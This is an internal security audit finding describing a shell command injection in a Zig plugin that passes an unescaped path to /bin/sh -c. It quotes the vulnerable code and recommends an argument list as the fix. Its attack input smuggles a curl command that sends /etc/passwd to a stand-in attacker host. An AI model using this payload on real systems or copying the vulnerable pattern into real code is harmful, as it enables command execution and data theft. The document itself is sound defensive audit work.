---
id: l4-003
phase: L4
slug: zig-plugin-sh-c-command-injection
severity: CRITICAL
title: Zig Plugin — Shell Command Injection via /bin/sh -c with Unsanitized Path
status: rejected-fp
rejection_reason: merged into consolidated p8-001
---

## Summary

The Zig plugin binding (`plugins/zig/crepuscularity.zig`) passes a shell command string to `/bin/sh -c` via `std.process.Child.run()`. The `path` argument is embedded into the command string via `std.fmt.allocPrint` without shell escaping. Any caller of the Zig plugin can inject arbitrary shell commands.

## Vulnerable Code

**File:** `plugins/zig/crepuscularity.zig:12-17`
```zig
const command = try std.fmt.allocPrint(allocator, "\"${{CREPUS_BIN:-crepus}}\" native ir \"{s}\"", .{path});
defer allocator.free(command);
const result = try std.process.Child.run(.{
    .allocator = allocator,
    .argv = &.{ "/bin/sh", "-c", command },
});
```

**Full function at lines 10-25:**
```zig
pub fn renderIr(allocator: std.mem.Allocator, path: []const u8) !ViewIr {
    const command = try std.fmt.allocPrint(allocator, "\"${{CREPUS_BIN:-crepus}}\" native ir \"{s}\"", .{path});
    defer allocator.free(command);
    const result = try std.process.Child.run(.{
        .allocator = allocator,
        .argv = &.{ "/bin/sh", "-c", command },
    });
    // ...
}
```

## Attack Input

```
path = "\";curl http://attacker.com/$(cat /etc/passwd | base64);\""
```

This produces shell command:
```sh
"crepus" native ir "";curl http://attacker.com/$(cat /etc/passwd | base64);""
```

## Root Cause

The `path` is interpolated directly into a shell command string via `allocPrint`, and this string is executed by `/bin/sh -c`. Although the path is wrapped in double quotes within the format string, shell metacharacters break out. The Zig process API would be safe if using an args list (`.argv = &.{"crepus", "native", "ir", path}`), but the plugin opts for shell execution.

## Code Path

```
plugins/zig/crepuscularity.zig
  renderIr(allocator, path) @ L10
    → allocPrint("\"${CREPUS_BIN:-crepus}\" native ir \"{s}\"", .{path}) @ L12
      → Child.run(.{ .argv = &.{"/bin/sh", "-c", command} }) @ L15-17
```

## Security Consequence

Arbitrary command execution as the user running the Zig plugin application.

## Evidence

- `plugins/zig/crepuscularity.zig:12-17` — `allocPrint` into `sh -c`
- No path validation or shell escaping
- Contrast with safe pattern: using `args` list directly avoids shell injection

## Existing Mitigations

None.

## Priority

**CRITICAL**
